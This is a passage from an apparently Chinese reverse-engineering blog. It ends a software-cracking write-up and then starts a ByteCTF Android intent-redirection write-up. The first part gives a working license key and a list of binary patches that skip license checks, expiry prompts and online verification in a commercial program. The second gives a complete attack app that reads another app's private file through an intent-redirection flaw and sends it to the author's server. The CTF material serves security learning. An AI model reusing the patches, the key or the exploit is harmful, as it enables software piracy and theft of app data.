<p><code>en_password[6] ^ p0) + ((p5 ^ en_password[9]) &lt;&lt; 16) + ((en_password[8] ^ en_password[4]) &lt;&lt; 8 = a1 = * 0x11) ^ 0xFFE53167) + 0x2C175)) ^ 0x22C078 ^ 0x5B8C27)</code></p>
<h5 id="get-pwd-by-name函数">get_pwd_by_name函数<a class="header-anchor" href="#get-pwd-by-name函数"> ¶ </a></h5>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211121195149903.png" alt="image-20211121195149903"></p>
<p>通过用户名、授权数量、到期时间来生成password中的4位，然后进行校验。</p>
<h2 id="注册机编写">注册机编写<a class="header-anchor" href="#注册机编写"> ¶ </a></h2>
<script src="https://gist.github.com/Forgo7ten/60bb03583de389ad17a87efa44871041.js"></script>
<p>key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: Forgo7ten</span><br><span class="line">License: 1f93-56ac-c63e-540d-a9ab</span><br></pre></td></tr></table></figure>
<p>会定期网络验证而失效</p>
<h2 id="爆破">爆破<a class="header-anchor" href="#爆破"> ¶ </a></h2>
<p>整个是通过判断verify_mothod函数的返回值来验证的。可以直接修改该函数的返回值。</p>
<p>为了不影响程序的运行逻辑，我选择了一条程序存在的路径，同时也是最简单的一条。直接在h48，改成强制跳转跳过if语句体，然后将原本的返回值修改为<code>0x2D</code>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211121202911313.png" alt="image-20211121202911313"></p>
<p>这样即实现了随意输入（不能为空，判断空的逻辑在verify函数中）便可以注册了。更不会有弹窗了，但感觉不是很完美。</p>
<hr>
<p>相关patch地址：（暂未反弹）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IDA修改base：0x0</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br><span class="line">核心校验注册码</span><br><span class="line"></span><br><span class="line">.text:000000000034A32A                 jmp     loc_34A619      ; Keypatch modified this from:</span><br><span class="line">.text:000000000034A32A                                         ;   jz loc_34A619</span><br><span class="line">.text:000000000034A32A                                         ; Keypatch padded NOP to next boundary: 1 bytes</span><br><span class="line"></span><br><span class="line">.text:000000000034A619                 mov     eax, 2Dh ; &#x27;-&#x27;  ; Keypatch modified this from:</span><br><span class="line">.text:000000000034A619                                         ;   mov eax, 93h</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br><span class="line">次要核心校验注册码</span><br><span class="line"></span><br><span class="line">.text:000000000034AD83                 jmp     loc_34AE63      ; Keypatch modified this from:</span><br><span class="line">.text:000000000034AD83                                         ;   jz short loc_34AD95</span><br><span class="line">.text:000000000034AD83                                         ;   mov eax, 113h</span><br><span class="line">.text:000000000034AD83                                         ; Keypatch padded NOP to next boundary: 2 bytes</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br><span class="line">判断代码</span><br><span class="line"></span><br><span class="line">.text:00000000001F547A                 jmp     loc_1F5575      ; Keypatch modified this from:</span><br><span class="line">.text:00000000001F547A                                         ;   jns loc_1F554A</span><br><span class="line">.text:00000000001F547A                                         ; Keypatch padded NOP to next boundary: 1 bytes</span><br><span class="line"></span><br><span class="line">.text:00000000001F554A                 jmp     short loc_1F5575 ; Keypatch modified this from:</span><br><span class="line">.text:00000000001F554A                                         ;   jnz short loc_1F5575</span><br><span class="line"></span><br><span class="line">.text:00000000001F559B                 nop                     ; Keypatch modified this from:</span><br><span class="line">.text:00000000001F559B                                         ;   jnz loc_1F5731</span><br><span class="line">.text:00000000001F559B                                         ; Keypatch padded NOP to next boundary: 5 bytes</span><br><span class="line">.text:00000000001F559C                 nop</span><br><span class="line">.text:00000000001F559D                 nop</span><br><span class="line">.text:00000000001F559E                 nop</span><br><span class="line">.text:00000000001F559F                 nop</span><br><span class="line">.text:00000000001F55A0                 nop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">去掉(EXPIRED)提示（非必要）</span><br><span class="line"></span><br><span class="line">.text:00000000001F567D                 jmp     short loc_1F5690 ; Keypatch modified this from:</span><br><span class="line">.text:00000000001F567D                                         ;   jns short loc_1F5690</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line">Single User License</span><br><span class="line"></span><br><span class="line">.text:00000000001F5F53                 jmp     short loc_1F5F66 ; Keypatch modified this from:</span><br><span class="line">.text:00000000001F5F53                                         ;   jnz loc_1F60B1</span><br><span class="line">.text:00000000001F5F53                                         ; Keypatch padded NOP to next boundary: 4 bytes</span><br><span class="line"></span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">删掉网络验证函数</span><br><span class="line"></span><br><span class="line">.text:00000000001F7754                 jmp     loc_1F7E35      ; Keypatch modified this from:</span><br><span class="line">.text:00000000001F7754                                         ;   jz loc_1F7E35</span><br><span class="line">.text:00000000001F7754                                         ; Keypatch padded NOP to next boundary: 1 bytes</span><br><span class="line"></span><br><span class="line">.text:00000000001F7E35                 mov     eax, 1          ; Keypatch modified this from:</span><br><span class="line">.text:00000000001F7E35                                         ;   mov eax, 0FFFFFFFFh</span><br><span class="line"></span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000034B173                 nop                     ; Keypatch modified this from:</span><br><span class="line">.text:000000000034B173                                         ;   jnz loc_34B2C2</span><br><span class="line">.text:000000000034B173                                         ; Keypatch padded NOP to next boundary: 5 bytes</span><br><span class="line">.text:000000000034B174                 nop</span><br><span class="line">.text:000000000034B175                 nop</span><br><span class="line">.text:000000000034B176                 nop</span><br><span class="line">.text:000000000034B177                 nop</span><br><span class="line">.text:000000000034B178                 nop</span><br><span class="line"></span><br><span class="line">Single User（非必要）</span><br><span class="line">.text:000000000034B1DF                 nop                     ; Keypatch modified this from:</span><br><span class="line">.text:000000000034B1DF                                         ;   jnz short loc_34B1FC</span><br><span class="line">.text:000000000034B1DF                                         ; Keypatch padded NOP to next boundary: 1 bytes</span><br><span class="line">.text:000000000034B1E0                 nop</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>由2021ByteCTF引出的intent重定向浅析</title>
    <url>/Reverse/2021/Analysis_of_intent_redirection_derived_from_2021bytectf/</url>
    <content><![CDATA[<h1 id="由2021ByteCTF引出的intent重定向浅析">由2021ByteCTF引出的intent重定向浅析<a class="header-anchor" href="#由2021ByteCTF引出的intent重定向浅析"> ¶ </a></h1>
<p><strong>在此先感谢ByteCTF的赛前培训，感谢summer师傅的倾情讲解</strong></p>
<h2 id="Intent浅要概述">Intent浅要概述<a class="header-anchor" href="#Intent浅要概述"> ¶ </a></h2>
<ul>
<li>Intent是Android程序中各组件之间进行交互的一种重要方式，它不仅可以指明当前组件想要执行的动作，还可以在不同组件之间传递数据。Intent一般可被用于启动活动、启动服务以及发送广播等场景。</li>
<li>Intent是一种运行时绑定（runtime binding)机制，它能在程序运行的过程中连接两个不同的组件。通过Intent，你的程序可以向Android表达某种请求或者意愿，Android会根据意愿的内容选择适当的组件来响应。</li>
</ul>
<p>Intent大致可以分为两种，显式Intent和隐式Intent。</p>
<ul>
<li>显式Intent：直接设置目标组件的<code>ComponentName</code>(目的组件)，用于一个应用内部的消息传递，比如启动另一个Activity或者一个services。<br>
通过Intent的<code>setComponent()</code>和<code>setClass()</code>来制定目标组件的<code>ComponentName</code>。</li>
<li>隐式Intent：没有指定<code>ComponentName</code>，而是通过指定一系列的action和category等信息，交由系统去分析，并找出合适的组件来响应。</li>
</ul>
<p>同时Intent可以携带以下信息</p>
<ol>
<li>
<p>component(组件)：目的组件</p>
<p>Component属性明确指定Intent的目标组件的类名称。如果 component这个属性有指定的话，将直接使用它指定的组件（显式Intent）。指定了这个属性以后，Intent的其它所有属性都是可选的。</p>
</li>
<li>
<p>Action(动作)：用来表现意图的行动</p>
<p>Action 是一个用户定义的字符串，用于描述一个 Android 应用程序组件，一个 Intent Filter 可以包含多个 Action。在 AndroidManifest.xml 的Activity 定义时，可以在其<code> &lt;intent-filter &gt;</code>节点指定一个Action列表用于标识 Activity 所能接受的“动作”。</p>
</li>
<li>
<p>category(类别)：用来表现动作的类别</p>
<p>该属性也是通过作为<code>&lt;intent-filter&gt;</code>的子元素来声明的。如果没有指定category，将会使用默认的<code>&quot;android.intent.category.DEFAULT&quot;</code>。只有当<code>&lt;action&gt;</code>和<code>&lt;category&gt;</code>中的内容同时能够匹配上Intent中指定的action和category时，这个活动才能响应Intent。</p>
<p>intent可以通过<code>addCategory()</code>方法指定多个<code>category</code>，只有同时满足时，才能匹配成功。</p>
</li>
<li>
<p>data(数据)：表示与动作要操纵的数据</p>
<p>Data是用一个uri对象来表示的。<code>&lt;data&gt;</code>标签可配置以下属性</p>
<ul>
<li><code>android:scheme</code> 。用于指定数据的协议部分，如上例中的<code>http</code>部分。</li>
<li><code>android:host</code> 。用于指定数据的主机名部分，如上例中的<code>www.baidu.com</code>部分。</li>
<li><code>android:port</code> 。用于指定数据的端口部分，一般紧随在主机名之后。</li>
<li><code>android:path</code> 。用于指定主机名和端口之后的部分，如一段网址中跟在域名之后的内容。</li>
<li><code>android:mimeType</code> 。用于指定可以处理的数据类型，允许使用通配符的方式进行指定。</li>
</ul>
<p>只有<code>&lt;data&gt;</code> 标签中指定的内容和Intent中携带的Data完全一致时，当前活动才能够响应该Intent。</p>
</li>
<li>
<p>type(数据类型)：指定Data属性的数据类型</p>
<p>如果Intent对象中既包含Uri又包含Type，那么，在<code>&lt;intent-filter&gt;</code>中也必须二者都包含才能通过测试。</p>
<p>Type属性用于明确指定Data属性的数据类型或MIME类型，但是通常来说，当Intent不指定Data属性时，Type属性才会起作用，否则Android系统将会根据Data属性值来分析数据的类型，所以无需指定Type属性。</p>
<p>data和type属性一般只需要一个，通过setData方法会把type属性设置为null，相反设置setType方法会把data设置为null，如果想要两个属性同时设置，要使用Intent.setDataAndType()方法。</p>
</li>
<li>
<p>extras(扩展信息)：扩展信息</p>
<p>提供附加数据。使用<code>putExtra()</code>方法来设置额外的key-value数据</p>
</li>
<li>
<p>Flags(标志位)：期望意图的运行模式</p>
<p>用来指示系统如何启动一个Activity（比如：这个Activity属于哪个Activity栈）和Activity启动后如何处理它(比如：是否把这个Activity归为最近的活动列表中)。</p>
</li>
</ol>
<h2 id="babydroid">babydroid<a class="header-anchor" href="#babydroid"> ¶ </a></h2>
<p>环境 API30_x86</p>
<h3 id="漏洞分析">漏洞分析<a class="header-anchor" href="#漏洞分析"> ¶ </a></h3>
<h4 id="服务源码文件server-py"><a href="http://xn--server-h18il4wc39bngdo60ay2z.py">服务源码文件server.py</a><a class="header-anchor" href="#服务源码文件server-py"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print_to_user(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> ____              __               ____                         __     </span></span><br><span class="line"><span class="string">/\  _`\           /\ \             /\  _`\                __    /\ \    </span></span><br><span class="line"><span class="string">\ \ \L\ \     __  \ \ \____  __  __\ \ \/\ \  _ __   ___ /\_\   \_\ \   </span></span><br><span class="line"><span class="string"> \ \  _ &lt;&#x27;  /&#x27;__`\ \ \ &#x27;__`\/\ \/\ \\ \ \ \ \/\`&#x27;__\/ __`\/\ \  /&#x27;_` \  </span></span><br><span class="line"><span class="string">  \ \ \L\ \/\ \L\.\_\ \ \L\ \ \ \_\ \\ \ \_\ \ \ \//\ \L\ \ \ \/\ \L\ \ </span></span><br><span class="line"><span class="string">   \ \____/\ \__/.\_\\ \_,__/\/`____ \\ \____/\ \_\\ \____/\ \_\ \___,_\</span></span><br><span class="line"><span class="string">    \/___/  \/__/\/_/ \/___/  `/___/&gt; \\/___/  \/_/ \/___/  \/_/\/__,_ /</span></span><br><span class="line"><span class="string">                                 /\___/                                 </span></span><br><span class="line"><span class="string">                                 \/__/                                  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">    print_to_user(<span class="string">&quot;Please proof of work again, exit...\n&quot;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print_to_user(<span class="string">&quot;Please enter your apk url:&quot;</span>)</span><br><span class="line">url = sys.stdin.readline().strip()</span><br><span class="line">EXP_FILE = download_file(url)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> check_apk(EXP_FILE):</span><br><span class="line">    print_to_user(<span class="string">&quot;Invalid apk file.\n&quot;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print_to_user(<span class="string">&quot;Preparing android emulator. This may takes about 2 minutes...\n&quot;</span>)</span><br><span class="line">emulator = setup_emulator()</span><br><span class="line">adb([<span class="string">&quot;wait-for-device&quot;</span>])</span><br><span class="line"></span><br><span class="line">adb_install(APK_FILE)</span><br><span class="line">adb_activity(<span class="string">f&quot;<span class="subst">&#123;VULER&#125;</span>/.MainActivity&quot;</span>, wait=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(FLAG_FILE, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    adb_broadcast(<span class="string">f&quot;com.bytectf.SET_FLAG&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;VULER&#125;</span>/.FlagReceiver&quot;</span>, extras=&#123;<span class="string">&quot;flag&quot;</span>: f.read()&#125;)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">adb_install(EXP_FILE)</span><br><span class="line">adb_activity(<span class="string">f&quot;<span class="subst">&#123;ATTACKER&#125;</span>/.MainActivity&quot;</span>)</span><br><span class="line"></span><br><span class="line">print_to_user(<span class="string">&quot;Launching! Let your apk fly for a while...\n&quot;</span>)</span><br><span class="line">time.sleep(EXPLOIT_TIME_SECS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.killpg(os.getpgid(emulator.pid), signal.SIGTERM)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    traceback.print_exc()</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>h13~h15：进行了一个sha256的验证，必须满足<code>sha256((prefix+proof).encode()).hexdigest().startswith(difficulty*&quot;0&quot;) == True</code>才能继续。其中<code>prefix</code>为<code>random_hex(6)</code>随机的字符；<code>proof</code>为用户输入的字符串。可以每次爆破得到正确的结果来输入。</p>
</li>
<li>
<p>h17~h22：用户输入一个url地址。server会将该文件下载下来，同时检查是否为apk。</p>
</li>
<li>
<p>h24~h26：新建一个安卓模拟器</p>
</li>
<li>
<p>h28：将含有漏洞的APK安装</p>
</li>
<li>
<p>h29：启动受害APK</p>
</li>
<li>
<p>h30~h31：打开服务器中保存的flag文件。然后通过adb命令发送一个广播，将flag传输给<code>.FlagReceiver</code>。其中命令如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell su root am broadcast -W -a com.bytectf.SET_FLAG -n com.bytectf.babydroid/.FlagReceiver -e flag [flag]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>h34~h35：安装attack apk并运行</p>
</li>
</ul>
<h4 id="apk分析">apk分析<a class="header-anchor" href="#apk分析"> ¶ </a></h4>
<h5 id="AndroidManifest-xml">AndroidManifest.xml<a class="header-anchor" href="#AndroidManifest-xml"> ¶ </a></h5>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211017193925146.png" alt="image-20211017193925146"></p>
<p>可以看到注册了两个activity，一个receiver，还有一个FileProvider。其中两个activity都是可导出（可被外部组件访问）的。</p>
<h5 id="MainActivity">MainActivity<a class="header-anchor" href="#MainActivity"> ¶ </a></h5>
<p>MainActivity中没有做操作，只是载入布局来显示</p>
<h5 id="Vulnerable-易受攻击的">Vulnerable(易受攻击的)<a class="header-anchor" href="#Vulnerable-易受攻击的"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>&#123;	</span><br><span class="line">       <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">       <span class="keyword">this</span>.startActivity(<span class="keyword">this</span>.getIntent().getParcelableExtra(<span class="string">&quot;intent&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>该Activity通过<code>getIntent()</code>首先获得intent对象，之后使用<code>getParcelableExtra(&quot;intent&quot;)</code>，获取反序列化后名为<code>&quot;intent&quot;</code>的extra数据，并使用<code>startActivity()</code>来启动该intent。</p>
<h5 id="FlagReceiver">FlagReceiver<a class="header-anchor" href="#FlagReceiver"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context,Intent intent)</span></span>&#123;	</span><br><span class="line">   String flag;</span><br><span class="line">   String str = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span> ((flag = intent.getStringExtra(str)) != <span class="keyword">null</span>) &#123;	</span><br><span class="line">      File file = <span class="keyword">new</span> File(context.getFilesDir(), str);</span><br><span class="line">      <span class="keyword">this</span>.writeFile(file, flag);</span><br><span class="line">      Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">   &#125;	</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该广播接收者从intent中取到一个key为<code>&quot;flag&quot;</code>的String类型数据，之后将其写出到<code>/data/data/[package_name]/files/flag</code>文件中。对应了server.py中传入flag的逻辑。我们想要获取的flag也就是这个路径。</p>
<h5 id="FileProvider">FileProvider<a class="header-anchor" href="#FileProvider"> ¶ </a></h5>
<p><a href="https://developer.android.google.cn/reference/androidx/core/content/FileProvider?hl=en">FileProvider  | Android Developers (google.cn)</a></p>
<p>FileProvider是<code>ContentProvider</code>的一个特殊的子类，通过使用<code>content://uri</code>来代替<code>file://uri</code>，来促进安全的共享与app关联的文件。</p>
<p>content URI允许临时的授予该文件的读写权限。所以当创建一个包含文件content URI的时候，（如果需要）可以通过<code>Intent.setFlags()</code>添加相应的权限。同时权限会通过Intent传递给接收的activity（或者服务）</p>
<p>在创建FileProvider时，需提供一个xml文件来指定该provider提供的文件。如<code>res/xml/file_paths.xml</code>，其中提供了相应的映射路径以及别名。同时需要在AndroidManifest.xml中的FileProvider对应的节点内定义<code>  &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot; &gt;</code>来声明。（其中resource属性内为提供的xml文件）</p>
<p>该APK的指定文件xml中定义如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>&lt;root-path&gt;</code>节点：代表设备的根目录</p>
<p>另外的节点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211017202244871.png" alt="image-20211017202244871"></p>
</li>
<li>
<p><code>name</code>属性：给该目录起的别名，用于隐藏路径</p>
</li>
<li>
<p><code>path</code>属性：临时授权访问的路径（该目录下的子目录</p>
</li>
</ul>
<p>则该APK提供的FileProvider提供了根目录，通过<code>root/</code>别名来访问</p>
<p>则如果我们想访问flag的存储路径，实际构造的部分uri应该为<code>root/data/data/[package_name]/files/flag</code>。</p>
<h3 id="利用思路">利用思路<a class="header-anchor" href="#利用思路"> ¶ </a></h3>
<h4 id="FlagURI">FlagURI<a class="header-anchor" href="#FlagURI"> ¶ </a></h4>
<p>题目将flag存储到了<code>/data/data/[package_name]/files/flag</code>文件。同时提供了一个FileProvider，则思路是通过FileProvider来将该文件读取。</p>
<p>首先需要构造一个content URI。格式为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content://[authorities]/[name]/[file_relative_path]</span><br></pre></td></tr></table></figure>
<p>则构造的URI为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure>
<h4 id="获得权限">获得权限<a class="header-anchor" href="#获得权限"> ¶ </a></h4>
<p>由于该<code>FileProvider</code>的<code>exported</code>属性（必须）设置为<code>false</code>。导致我们无法在外部组件中直接使用该provider。</p>
<p>但是该apk提供了一个<code>Vulnerable</code>Activity，并且（不做任何校验的）将接收到的intent内中的key为<code>&quot;intent&quot;</code>的extra数据当作intent，并使用<code>startActivity()</code>来启动。这样就对启动的activity进行了临时的授权，可以访问该应用中未导出的组件。</p>
<p>因此，我们可以设置一个intent来启动<code>Vulnerable</code>，同时给该Intent附加一个key为<code>intent</code>的数据，该数据包含着构造好的恶意intent。</p>
<p>当<code>Vulnerable</code>被启动时，就会找到intent的数据，我们在intent中附上我们的attack APK的Activity，同时附加上flag的contentURI。</p>
<p>之后转到我们自己的Activity时，就可以任意读写目标应用内部文件。</p>
<h3 id="Attack代码实现">Attack代码实现<a class="header-anchor" href="#Attack代码实现"> ¶ </a></h3>
<h4 id="AttackAPP">AttackAPP<a class="header-anchor" href="#AttackAPP"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 判断一下是否是被目标apk来start的该Activity</span></span><br><span class="line">    <span class="keyword">if</span> (getIntent().getAction().equals(<span class="string">&quot;evil&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 获取接收到的uri</span></span><br><span class="line">        Uri data = getIntent().getData();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义一个字符输入流</span></span><br><span class="line">            InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(getContentResolver().openInputStream(data));</span><br><span class="line">            <span class="keyword">char</span>[] buf = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">            StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != isr.read(buf, <span class="number">0</span>, <span class="number">1024</span>)) &#123;</span><br><span class="line">                sb.append(String.valueOf(buf));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 读取的内容输入存储到flag</span></span><br><span class="line">            String flag = <span class="keyword">new</span> String(sb);</span><br><span class="line">            Log.d(<span class="string">&quot;PwnPwn&quot;</span>, flag);</span><br><span class="line">            ((TextView) findViewById(R.id.tv_show)).setText(<span class="keyword">new</span> String(sb));</span><br><span class="line">            <span class="comment">// 通过网络、将信息传输回来获取</span></span><br><span class="line">            sendData(<span class="string">&quot;getFlag&quot;</span>,flag);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个action为&quot;evil&quot;的Intent</span></span><br><span class="line">        Intent evil = <span class="keyword">new</span> Intent(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="comment">// 设定目的组件为当前MainActivity，也可以单独放在另一个AttackActivity中</span></span><br><span class="line">        evil.setClassName(getPackageName(), MainActivity.class.getName());</span><br><span class="line">        <span class="comment">// 设置操纵data数据为 flag所在文件的contentURI</span></span><br><span class="line">        evil.setData(Uri.parse(pwnUri));</span><br><span class="line">        <span class="comment">// 添加读写权限</span></span><br><span class="line">        evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建一个intent，用于启动目标APK</span></span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        <span class="comment">// 启动的目标Activity为Vulnerable</span></span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">        <span class="comment">// 同时将构造好的evil Intent当作 key &quot;intent&quot;的数据包装进去</span></span><br><span class="line">        intent.putExtra(<span class="string">&quot;intent&quot;</span>, evil);</span><br><span class="line">        <span class="comment">// 启动目标apk</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取到flag后设置到TextView上，同时通过<code>sendData()</code>方法使用get或post请求将数据回显到自己搭建的服务。该方法不表。</p>
<p>同时还需要声明网络权限</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>在API28+的应用默认禁止使用明文网络流量(flase)，因此还需要在<code>&lt;application&gt;</code>节点中设置属性</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:usesCleartextTraffic=&quot;true&quot;</span><br></pre></td></tr></table></figure>
<p>需要注意一点的是attackAPP是由server.py来启动的，内定义了PackageName应为<code>&quot;com.bytectf.pwnbabydroid&quot;</code></p>
<h4 id="本地实现">本地实现<a class="header-anchor" href="#本地实现"> ¶ </a></h4>
<p>首先输入命令，来生成一个flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell su root am broadcast -W -a com.bytectf.SET_FLAG -n com.bytectf.babydroid/.FlagReceiver -e flag ByteCTF&#123;testFlagxxxxx&#125;</span><br></pre></td></tr></table></figure>
<p>然后安装恶意apk，运行</p>
<p>效果图如下，可见是由Vulnerable来启动的MainActivity</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//pwn2.gif" alt="pwn2"></p>
<h2 id="easydroid">easydroid<a class="header-anchor" href="#easydroid"> ¶ </a></h2>
<p>环境 API27_x86</p>
<h3 id="漏洞分析-2">漏洞分析<a class="header-anchor" href="#漏洞分析-2"> ¶ </a></h3>
<h4 id="服务源码文件server-py-2"><a href="http://xn--server-h18il4wc39bngdo60ay2z.py">服务源码文件server.py</a><a class="header-anchor" href="#服务源码文件server-py-2"> ¶ </a></h4>
<p>该server文件与上题的server文件大体相同</p>
<p>修改了环境为API27</p>
<p>修改了attackAPP和targetAPP的包名</p>
<h4 id="apk分析-2">apk分析<a class="header-anchor" href="#apk分析-2"> ¶ </a></h4>
<h5 id="AndroidManifest">AndroidManifest<a class="header-anchor" href="#AndroidManifest"> ¶ </a></h5>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Easydroid&quot;</span> <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span 